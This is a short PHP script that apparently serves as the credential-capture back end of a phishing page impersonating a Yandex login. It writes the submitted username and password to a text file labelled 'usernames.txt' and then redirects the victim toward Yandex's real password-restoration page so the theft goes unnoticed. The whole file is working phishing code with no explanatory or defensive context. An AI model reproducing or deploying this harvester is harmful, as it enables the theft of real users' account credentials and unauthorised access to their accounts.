<?php

file_put_contents("usernames.txt", "Yandex Username: " . $_POST['login'] . "\nPassword: " . $_POST['passwd'] . "\n", FILE_APPEND);
$url = "redirectUrl"; # https://passport.yandex.com/restoration
header("Location: $url");
exit();
?>